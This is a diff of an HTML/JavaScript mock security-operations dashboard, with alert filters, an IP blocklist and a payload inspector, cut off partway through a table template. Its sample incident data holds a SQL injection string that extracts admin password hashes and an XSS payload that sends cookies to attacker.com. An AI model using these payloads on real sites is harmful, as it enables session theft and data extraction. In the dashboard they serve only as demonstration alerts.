@@ -3,31 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AegisGuard - Intrusion Detection System (IDS)</title>
-    <!-- Chart.js for Dashboard Visualizations -->
+    <title>Enterprise SOC Analyst Console & IDPS</title>
+    <!-- Chart.js for Advanced Analytics -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <!-- Lucide Icons -->
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         :root {
-            --bg-dark: #0b0f19;
-            --bg-card: #111827;
-            --bg-card-hover: #1f2937;
-            --border-color: #1f2937;
-            --text-main: #f3f4f6;
-            --text-muted: #9ca3af;
+            --bg-dark: #070a12;
+            --bg-panel: #0f172a;
+            --bg-panel-hover: #1e293b;
+            --border-color: #334155;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
             --accent-cyan: #06b6d4;
             --accent-blue: #3b82f6;
             --danger-red: #ef4444;
             --warning-amber: #f59e0b;
             --success-green: #10b981;
+            --purple-badge: #8b5cf6;
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
 
         body {
@@ -38,459 +39,490 @@
             overflow-x: hidden;
         }
 
-        /* Sidebar Navigation */
+        /* Sidebar Nav */
         sidebar {
-            width: 250px;
-            background-color: #0d1322;
+            width: 260px;
+            background-color: #0b1120;
             border-right: 1px solid var(--border-color);
             display: flex;
             flex-direction: column;
             padding: 20px;
             position: fixed;
             height: 100vh;
+            z-index: 10;
         }
 
         .logo {
             display: flex;
             align-items: center;
-            gap: 10px;
-            font-size: 1.2rem;
-            font-weight: bold;
+            gap: 12px;
+            font-size: 1.1rem;
+            font-weight: 800;
             color: var(--accent-cyan);
-            margin-bottom: 40px;
+            margin-bottom: 30px;
+            letter-spacing: 0.5px;
         }
 
         .nav-links {
             list-style: none;
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 8px;
         }
 
         .nav-item {
             display: flex;
             align-items: center;
             gap: 12px;
-            padding: 12px 16px;
+            padding: 10px 14px;
             color: var(--text-muted);
-            border-radius: 8px;
+            border-radius: 6px;
             cursor: pointer;
             transition: all 0.2s;
             text-decoration: none;
+            font-size: 0.9rem;
         }
 
         .nav-item:hover, .nav-item.active {
-            background-color: var(--bg-card);
+            background-color: var(--bg-panel);
             color: var(--accent-cyan);
+            border-left: 3px solid var(--accent-cyan);
         }
 
-        /* Main Layout */
+        /* Main Workspace */
         main {
-            margin-left: 250px;
+            margin-left: 260px;
             flex: 1;
-            padding: 24px;
+            padding: 20px 28px;
             display: flex;
             flex-direction: column;
-            gap: 24px;
+            gap: 20px;
+            width: calc(100% - 260px);
         }
 
-        /* Header */
+        /* Header Bar */
         header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding-bottom: 16px;
+            padding-bottom: 12px;
             border-bottom: 1px solid var(--border-color);
         }
 
-        .system-status {
+        .soc-controls {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .mode-toggle {
             display: flex;
             align-items: center;
             gap: 8px;
-            background-color: rgba(16, 185, 129, 0.1);
-            color: var(--success-green);
-            padding: 6px 14px;
+            background-color: var(--bg-panel);
+            padding: 6px 12px;
             border-radius: 20px;
+            border: 1px solid var(--border-color);
             font-size: 0.85rem;
-            border: 1px solid rgba(16, 185, 129, 0.2);
         }
 
-        .pulse-dot {
-            width: 8px;
-            height: 8px;
-            background-color: var(--success-green);
-            border-radius: 50%;
-            box-shadow: 0 0 8px var(--success-green);
-            animation: pulse 1.5s infinite;
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 38px;
+            height: 20px;
         }
 
-        @keyframes pulse {
-            0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.4; transform: scale(1.2); }
-            100% { opacity: 1; transform: scale(1); }
+        .switch input { opacity: 0; width: 0; height: 0; }
+
+        .slider {
+            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #334155; transition: .3s; border-radius: 20px;
         }
 
-        /* Dashboard Cards Grid */
-        .stats-grid {
+        .slider:before {
+            position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px;
+            background-color: white; transition: .3s; border-radius: 50%;
+        }
+
+        input:checked + .slider { background-color: var(--danger-red); }
+        input:checked + .slider:before { transform: translateX(18px); }
+
+        /* KPI Cards */
+        .kpi-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
         }
 
         .card {
-            background-color: var(--bg-card);
+            background-color: var(--bg-panel);
             border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 20px;
-        }
-
-        .stat-card {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        .stat-title {
-            color: var(--text-muted);
-            font-size: 0.85rem;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            border-radius: 8px;
+            padding: 16px;
         }
 
         .stat-value {
-            font-size: 1.8rem;
-            font-weight: bold;
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-top: 4px;
         }
 
-        /* Charts Layout */
-        .charts-container {
+        /* Advanced Filter Bar */
+        .filter-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            background-color: var(--bg-panel);
+            padding: 14px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            align-items: center;
+        }
+
+        .filter-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        input[type="text"], select {
+            background-color: var(--bg-dark);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 7px 12px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            outline: none;
+        }
+
+        input[type="text"]:focus, select:focus {
+            border-color: var(--accent-cyan);
+        }
+
+        .btn {
+            background-color: var(--accent-blue);
+            color: white;
+            border: none;
+            padding: 7px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: opacity 0.2s;
+        }
+
+        .btn:hover { opacity: 0.9; }
+        .btn-danger { background-color: var(--danger-red); }
+        .btn-success { background-color: var(--success-green); }
+
+        /* Workspace Grid Layout */
+        .dashboard-grid {
             display: grid;
             grid-template-columns: 2fr 1fr;
             gap: 20px;
         }
 
-        .chart-box {
-            position: relative;
-            height: 280px;
-        }
-
-        /* Logs Section */
-        .logs-section {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-
+        /* Tables & Lists */
         .table-wrapper {
+            overflow-x: auto;
+            max-height: 380px;
             overflow-y: auto;
-            max-height: 300px;
-            border-radius: 8px;
         }
 
         table {
             width: 100%;
             border-collapse: collapse;
             text-align: left;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
         }
 
         th {
-            background-color: #1a2332;
+            background-color: #1e293b;
             color: var(--text-muted);
-            padding: 12px;
+            padding: 10px 12px;
             position: sticky;
             top: 0;
+            z-index: 2;
         }
 
         td {
-            padding: 12px;
+            padding: 10px 12px;
             border-bottom: 1px solid var(--border-color);
+            white-space: nowrap;
         }
 
-        tr:hover {
-            background-color: var(--bg-card-hover);
-        }
+        tr:hover { background-color: var(--bg-panel-hover); }
 
         .badge {
-            padding: 4px 8px;
+            padding: 3px 8px;
             border-radius: 4px;
-            font-size: 0.75rem;
-            font-weight: bold;
+            font-size: 0.72rem;
+            font-weight: 700;
             text-transform: uppercase;
         }
 
-        .badge-high { background-color: rgba(239, 68, 68, 0.2); color: var(--danger-red); }
-        .badge-medium { background-color: rgba(245, 158, 11, 0.2); color: var(--warning-amber); }
-        .badge-low { background-color: rgba(6, 182, 212, 0.2); color: var(--accent-cyan); }
+        .badge-CRITICAL { background-color: rgba(239, 68, 68, 0.25); color: #fca5a5; border: 1px solid var(--danger-red); }
+        .badge-HIGH { background-color: rgba(245, 158, 11, 0.25); color: #fde047; border: 1px solid var(--warning-amber); }
+        .badge-MEDIUM { background-color: rgba(59, 130, 246, 0.25); color: #93c5fd; border: 1px solid var(--accent-blue); }
+        .badge-LOW { background-color: rgba(16, 185, 129, 0.25); color: #6ee7b7; border: 1px solid var(--success-green); }
 
-        /* Traffic Stream Console */
-        .stream-console {
-            background-color: #050811;
+        /* Packet Payload Inspector Window */
+        .payload-inspector {
+            background-color: #020617;
             border: 1px solid var(--border-color);
-            font-family: 'Courier New', Courier, monospace;
+            border-radius: 6px;
             padding: 12px;
-            height: 300px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.8rem;
+            color: #38bdf8;
+            height: 180px;
             overflow-y: auto;
-            border-radius: 8px;
-            font-size: 0.82rem;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
 
-        .console-line {
-            margin-bottom: 6px;
-            line-height: 1.4;
+        /* Firewall IP Blacklist Box */
+        .ip-block-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-height: 250px;
+            overflow-y: auto;
         }
-        .console-line.suspicious {
-            color: var(--danger-red);
-            font-weight: bold;
+
+        .ip-block-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #020617;
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            font-size: 0.85rem;
         }
-        .console-line.normal {
-            color: var(--text-muted);
+
+        .chart-container {
+            position: relative;
+            height: 200px;
         }
     </style>
 </head>
 <body>
 
-    <!-- Sidebar -->
+    <!-- Sidebar Nav -->
     <sidebar>
         <div class="logo">
-            <i data-lucide="shield-alert"></i>
-            <span>AegisGuard IDS</span>
+            <i data-lucide="shield-check"></i>
+            <span>SOC Incident Console</span>
         </div>
         <ul class="nav-links">
-            <li><a href="#" class="nav-item active"><i data-lucide="layout-dashboard"></i> Dashboard</a></li>
-            <li><a href="#" class="nav-item"><i data-lucide="activity"></i> Traffic Monitor</a></li>
-            <li><a href="#" class="nav-item"><i data-lucide="file-text"></i> Attack Logs</a></li>
-            <li><a href="#" class="nav-item"><i data-lucide="sliders"></i> Detection Rules</a></li>
-            <li><a href="#" class="nav-item"><i data-lucide="settings"></i> Settings</a></li>
+            <li><a href="#" class="nav-item active"><i data-lucide="layout-dashboard"></i> SIEM Dashboard</a></li>
+            <li><a href="#" class="nav-item"><i data-lucide="shield-ban"></i> Firewall & IP Rules</a></li>
+            <li><a href="#" class="nav-item"><i data-lucide="search-code"></i> Packet Inspector</a></li>
+            <li><a href="#" class="nav-item"><i data-lucide="file-warning"></i> Incident Reports</a></li>
+            <li><a href="#" class="nav-item"><i data-lucide="settings"></i> System Config</a></li>
         </ul>
     </sidebar>
 
-    <!-- Main Content -->
+    <!-- Main Workspace -->
     <main>
-        <!-- Header Section -->
+        <!-- Header & IDPS Control -->
         <header>
             <div>
-                <h1>Intrusion Detection System</h1>
-                <p style="color: var(--text-muted); font-size: 0.9rem;">Real-time network surveillance and threat analytics</p>
+                <h2>Security Operations Center (SOC) Console</h2>
+                <p style="color: var(--text-muted); font-size: 0.85rem;">Real-time Threat Monitoring, Deep Packet Inspection & Active Mitigation</p>
             </div>
-            <div class="system-status">
-                <div class="pulse-dot"></div>
-                <span>IDS Active & Monitoring</span>
+            <div class="soc-controls">
+                <div class="mode-toggle">
+                    <span>Prevention Mode (IPS)</span>
+                    <label class="switch">
+                        <input type="checkbox" id="ipsToggle" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
             </div>
         </header>
 
-        <!-- Requirement 5: Attack Statistics in Dashboard -->
-        <section class="stats-grid">
-            <div class="card stat-card">
-                <span class="stat-title">Total Packets Inspected</span>
-                <span class="stat-value" id="stat-packets">128,490</span>
-            </div>
-            <div class="card stat-card">
-                <span class="stat-title">Suspicious Activities</span>
-                <span class="stat-value" style="color: var(--warning-amber);" id="stat-suspicious">142</span>
-            </div>
-            <div class="card stat-card">
-                <span class="stat-title">Attacks Blocked</span>
-                <span class="stat-value" style="color: var(--danger-red);" id="stat-attacks">38</span>
-            </div>
-            <div class="card stat-card">
-                <span class="stat-title">Active Alert Level</span>
-                <span class="stat-value" style="color: var(--accent-cyan);">ELEVATED</span>
-            </div>
-        </section>
-
-        <!-- Requirement 1 & 5: Network Traffic Chart & Vector Breakdown -->
-        <section class="charts-container">
+        <!-- KPI Metrics -->
+        <section class="kpi-grid">
             <div class="card">
-                <h3 style="margin-bottom: 15px;">Network Traffic & Detection Rate</h3>
-                <div class="chart-box">
-                    <canvas id="trafficChart"></canvas>
-                </div>
+                <div style="color: var(--text-muted); font-size: 0.8rem;">EVENTS PROCESSED</div>
+                <div class="stat-value" id="kpi-events">892,104</div>
             </div>
             <div class="card">
-                <h3 style="margin-bottom: 15px;">Attack Categories</h3>
-                <div class="chart-box">
-                    <canvas id="attackPieChart"></canvas>
+                <div style="color: var(--text-muted); font-size: 0.8rem;">ACTIVE ALERTS</div>
+                <div class="stat-value" style="color: var(--warning-amber);" id="kpi-alerts">14</div>
+            </div>
+            <div class="card">
+                <div style="color: var(--text-muted); font-size: 0.8rem;">ACTIVE BLOCKED IPs</div>
+                <div class="stat-value" style="color: var(--danger-red);" id="kpi-blocked">3</div>
+            </div>
+            <div class="card">
+                <div style="color: var(--text-muted); font-size: 0.8rem;">SOC ANALYST STATUS</div>
+                <div class="stat-value" style="color: var(--success-green); font-size: 1.2rem; margin-top:8px;">
+                    <i data-lucide="user-check" style="vertical-align: middle;"></i> L2 Analyst Active
                 </div>
             </div>
         </section>
 
-        <!-- Requirement 1, 2, 3, 4: Real-time Monitor Console & Attack Logs -->
-        <section class="logs-section">
-            <!-- Requirement 1 & 2: Network Traffic & Suspicious Activity Stream -->
-            <div class="card">
-                <h3 style="margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
-                    <i data-lucide="radio" style="color: var(--accent-cyan);"></i> Live Network Packet Stream
-                </h3>
-                <div class="stream-console" id="console-stream">
-                    <!-- Dynamic live logs injected here -->
+        <!-- Advanced Filter Controls -->
+        <section class="filter-bar">
+            <div class="filter-group">
+                <i data-lucide="search"></i>
+                <input type="text" id="filterIpInput" placeholder="Filter by IP address..." onkeyup="applyFilters()">
+            </div>
+            <div class="filter-group">
+                <span>Severity:</span>
+                <select id="filterSeverity" onchange="applyFilters()">
+                    <option value="ALL">All Severities</option>
+                    <option value="CRITICAL">Critical</option>
+                    <option value="HIGH">High</option>
+                    <option value="MEDIUM">Medium</option>
+                    <option value="LOW">Low</option>
+                </select>
+            </div>
+            <div class="filter-group">
+                <span>Vector:</span>
+                <select id="filterVector" onchange="applyFilters()">
+                    <option value="ALL">All Vectors</option>
+                    <option value="SQL Injection">SQL Injection</option>
+                    <option value="SYN Flood DDoS">SYN Flood DDoS</option>
+                    <option value="XSS Payload">XSS Payload</option>
+                    <option value="Brute Force SSH">Brute Force SSH</option>
+                </select>
+            </div>
+            <button class="btn" onclick="resetFilters()"><i data-lucide="rotate-ccw"></i> Reset Filters</button>
+        </section>
+
+        <!-- Main Incident Dashboard Workspace -->
+        <section class="dashboard-grid">
+            <!-- Left Workspace: Alerts & Packet Payload Inspection -->
+            <div style="display: flex; flex-direction: column; gap: 20px;">
+                <!-- Real-Time Threat Stream Table -->
+                <div class="card">
+                    <h3 style="margin-bottom: 12px; font-size: 1rem; display: flex; justify-content: space-between; align-items: center;">
+                        <span><i data-lucide="bell" style="color: var(--warning-amber);"></i> Real-Time Security Incident Feed</span>
+                        <span style="font-size: 0.75rem; color: var(--text-muted);">Click any row to inspect packet payload</span>
+                    </h3>
+                    <div class="table-wrapper">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Timestamp</th>
+                                    <th>Source IP</th>
+                                    <th>Signature / Attack</th>
+                                    <th>Severity</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="alerts-table-body">
+                                <!-- Dynamically Rendered -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Deep Packet Inspector -->
+                <div class="card">
+                    <h3 style="margin-bottom: 10px; font-size: 0.95rem; display: flex; align-items: center; gap: 8px;">
+                        <i data-lucide="file-search" style="color: var(--accent-cyan);"></i> PCAP Raw Payload Inspector
+                    </h3>
+                    <div class="payload-inspector" id="payload-display">
+-- SELECT AN INCIDENT ROW ABOVE TO INSPECT RAW PACKET HEADERS & HEX PAYLOAD --
+                    </div>
                 </div>
             </div>
 
-            <!-- Requirement 3 & 4: Generated Real-Time Alerts & Logged Attack Attempts -->
-            <div class="card">
-                <h3 style="margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
-                    <i data-lucide="alert-triangle" style="color: var(--danger-red);"></i> Logged Attack Attempts
-                </h3>
-                <div class="table-wrapper">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>Timestamp</th>
-                                <th>Source IP</th>
-                                <th>Attack Vector</th>
-                                <th>Severity</th>
-                            </tr>
-                        </thead>
-                        <tbody id="attack-logs-body">
-                            <!-- Injected by JavaScript -->
-                        </tbody>
-                    </table>
+            <!-- Right Workspace: Firewall Management & SOC Mitigation -->
+            <div style="display: flex; flex-direction: column; gap: 20px;">
+                <!-- Manual IP Firewall Enforcement -->
+                <div class="card">
+                    <h3 style="margin-bottom: 12px; font-size: 0.95rem; display: flex; align-items: center; gap: 8px;">
+                        <i data-lucide="shield-alert" style="color: var(--danger-red);"></i> Firewall Blacklist Control
+                    </h3>
+                    <div style="display: flex; gap: 8px; margin-bottom: 12px;">
+                        <input type="text" id="manualIpInput" placeholder="Enter IP address (e.g. 185.220.101.5)" style="flex:1;">
+                        <button class="btn btn-danger" onclick="manualBlockIp()"><i data-lucide="lock"></i> Block IP</button>
+                    </div>
+                    <div class="ip-block-list" id="blocked-ip-list">
+                        <!-- Rendered dynamically -->
+                    </div>
+                </div>
+
+                <!-- Attack Vector Trend Analytics -->
+                <div class="card">
+                    <h3 style="margin-bottom: 12px; font-size: 0.95rem;">Threat Signature Breakdown</h3>
+                    <div class="chart-container">
+                        <canvas id="threatChart"></canvas>
+                    </div>
                 </div>
             </div>
         </section>
     </main>
 
     <script>
-        // Initialize Lucide Icons
         lucide.createIcons();
 
-        // Data Generators for Simulation
-        const attackTypes = ["SYN Flood DDoS", "SQL Injection", "Port Scan", "XSS Payload", "Brute Force SSH"];
-        const ips = ["192.168.1.104", "45.33.32.156", "185.220.101.5", "10.0.0.45", "198.51.100.23"];
-        
-        let packetCount = 128490;
-        let suspiciousCount = 142;
-        let attackCount = 38;
+        // Database & System State
+        const blockedIPs = new Set(["185.220.101.5", "45.33.32.156"]);
+        let incidents = [
+            { id: 1, time: "22:10:04", ip: "185.220.101.5", attack: "SQL Injection", severity: "CRITICAL", payload: "GET /api/user?id=1' UNION SELECT username, password_hash FROM admin_users-- HTTP/1.1\nHost: target-app.com\nUser-Agent: sqlmap/1.6.0" },
+            { id: 2, time: "22:09:42", ip: "198.51.100.23", attack: "SYN Flood DDoS", severity: "HIGH", payload: "TCP SYN Stream [Port 80] - Flags: [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1" },
+            { id: 3, time: "22:08:15", ip: "10.0.0.45", attack: "Brute Force SSH", severity: "MEDIUM", payload: "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\nFailed password for root from 10.0.0.45 port 49210 ssh2" },
+            { id: 4, time: "22:05:30", ip: "45.33.32.156", attack: "XSS Payload", severity: "HIGH", payload: "POST /comments HTTP/1.1\nHost: target-app.com\nBody: comment=<script>document.location='http://attacker.com/steal?cookie='+document.cookie<\/script>" }
+        ];
 
-        // Requirement 5: Display Attack Statistics (Chart.js Setup)
-        const ctxTraffic = document.getElementById('trafficChart').getContext('2d');
-        const trafficChart = new Chart(ctxTraffic, {
-            type: 'line',
+        // Chart.js Configuration
+        const ctxThreat = document.getElementById('threatChart').getContext('2d');
+        const threatChart = new Chart(ctxThreat, {
+            type: 'bar',
             data: {
-                labels: ['10s ago', '8s ago', '6s ago', '4s ago', '2s ago', 'Now'],
+                labels: ['SQLi', 'DDoS', 'XSS', 'Brute Force'],
                 datasets: [{
-                    label: 'Packets / Sec',
-                    data: [120, 190, 300, 500, 240, 320],
-                    borderColor: '#06b6d4',
-                    tension: 0.4,
-                    fill: false
-                }, {
-                    label: 'Suspicious Traffic',
-                    data: [2, 5, 25, 40, 10, 15],
-                    borderColor: '#ef4444',
-                    tension: 0.4,
-                    fill: false
-                }]
-            },
-            options: {
-                responsive: true,
-                maintainAspectRatio: false,
-                plugins: { legend: { labels: { color: '#9ca3af' } } },
-                scales: {
-                    x: { ticks: { color: '#9ca3af' }, grid: { color: '#1f2937' } },
-                    y: { ticks: { color: '#9ca3af' }, grid: { color: '#1f2937' } }
-                }
-            }
-        });
-
-        const ctxPie = document.getElementById('attackPieChart').getContext('2d');
-        new Chart(ctxPie, {
-            type: 'doughnut',
-            data: {
-                labels: ['DDoS', 'SQLi', 'Port Scan', 'Other'],
-                datasets: [{
-                    data: [40, 25, 20, 15],
-                    backgroundColor: ['#ef4444', '#f59e0b', '#3b82f6', '#06b6d4'],
+                    label: 'Incidents Captured',
+                    data: [12, 19, 7, 15],
+                    backgroundColor: ['#ef4444', '#f59e0b', '#06b6d4', '#3b82f6'],
                     borderWidth: 0
                 }]
             },
             options: {
                 responsive: true,
                 maintainAspectRatio: false,
-                plugins: { legend: { position: 'bottom', labels: { color: '#9ca3af' } } }
+                plugins: { legend: { display: false } },
+                scales: {
+                    x: { ticks: { color: '#94a3b8' }, grid: { display: false } },
+                    y: { ticks: { color: '#94a3b8' }, grid: { color: '#334155' } }
+                }
             }
         });
 
-        // Requirement 1 & 2: Monitor Traffic & Detect Suspicious Activity
-        const consoleStream = document.getElementById('console-stream');
-        const attackLogBody = document.getElementById('attack-logs-body');
+        // Render Alerts Table with Filters
+        function renderAlertsTable() {
+            const tbody = document.getElementById('alerts-table-body');
+            const ipFilter = document.getElementById('filterIpInput').value.toLowerCase();
+            const sevFilter = document.getElementById('filterSeverity').value;
+            const vecFilter = document.getElementById('filterVector').value;
 
-        function generateTraffic() {
-            packetCount += Math.floor(Math.random() * 20) + 5;
-            document.getElementById('stat-packets').innerText = packetCount.toLocaleString();
+            tbody.innerHTML = '';
 
-            const isSuspicious = Math.random() < 0.25; // 25% chance to simulate threat
-            const time = new Date().toLocaleTimeString();
-            const ip = ips[Math.floor(Math.random() * ips.length)];
-            const consoleLine = document.createElement('div');
+            incidents.forEach(item => {
+                // Apply Filter Engine
+                const matchesIp = item.ip.toLowerCase().includes(ipFilter);
+                const matchesSev = sevFilter === 'ALL' || item.severity === sevFilter;
+                const matchesVec = vecFilter === 'ALL' || item.attack === vecFilter;
 
-            if (isSuspicious) {
-                suspiciousCount++;
-                document.getElementById('stat-suspicious').innerText = suspiciousCount;
+                if (matchesIp && matchesSev && matchesVec) {
+                    const isBlocked = blockedIPs.has(item.ip);
+                    const tr = document.createElement('tr');
+                    tr.style.cursor = 'pointer';
+                    tr.onclick = () => inspectPayload(item.id);
 
-                const attack = attackTypes[Math.floor(Math.random() * attackTypes.length)];
-                consoleLine.className = 'console-line suspicious';
-                consoleLine.innerText = `[${time}] ALERT: Suspicious activity detected from ${ip} -> Payload matched rule: [${attack}]`;
-
-                // Requirement 3 & 4: Real-Time Alerts & Attack Logging
-                logAttackAttempt(time, ip, attack);
-            } else {
-                consoleLine.className = 'console-line normal';
-                consoleLine.innerText = `[${time}] INFO: TCP Handshake ACK from ${ip}:8080 - 64 bytes`;
-            }
-
-            consoleStream.appendChild(consoleLine);
-            consoleStream.scrollTop = consoleStream.scrollHeight;
-
-            // Keep log console manageable
-            if (consoleStream.childNodes.length > 50) {
-                consoleStream.removeChild(consoleStream.firstChild);
-            }
-        }
-
-        // Requirement 4: Log attack attempts into structured log table
-        function logAttackAttempt(time, ip, attack) {
-            attackCount++;
-            document.getElementById('stat-attacks').innerText = attackCount;
-
-            const row = document.createElement('tr');
-            const severity = attack.includes('DDoS') || attack.includes('SQL') ? 'HIGH' : 'MEDIUM';
-            const badgeClass = severity === 'HIGH' ? 'badge-high' : 'badge-medium';
-
-            row.innerHTML = `
-                <td>${time}</td>
-                <td>${ip}</td>
-                <td>${attack}</td>
-                <td><span class="badge ${badgeClass}">${severity}</span></td>
-            `;
-
-            attackLogBody.insertBefore(row, attackLogBody.firstChild);
-
-            // Limit table rows display
-            if (attackLogBody.children.length > 10) {
-                attackLogBody.removeChild(attackLogBody.lastChild);
-            }
-        }
-
-        // Continuous Loop to simulate live monitoring
-        setInterval(generateTraffic, 1200);
-
-        // Update live chart data periodically
-        setInterval(() => {
-            const now = new Date().toLocaleTimeString().split(' ')[0];
-            trafficChart.data.labels.shift();
-            trafficChart.data.labels.push(now);
-
-            trafficChart.data.datasets[0].data.shift();
-            trafficChart.data.datasets[0].data.push(Math.floor(Math.random() * 300) + 100);
-
-            trafficChart.data.datasets[1].data.shift();
-            trafficChart.data.datasets[1].data.push(Math.floor(Math.random() * 30));
-
-            trafficChart.update();
-        }, 2000);
-    </script>
-</body>
-  </html>
-                  
+                    tr.innerHTML = `
+                        <td>${item.time}</td>
+                        <td><strong>${item.ip}</strong> ${isBlocked ? '<span style="color:var(--danger-red
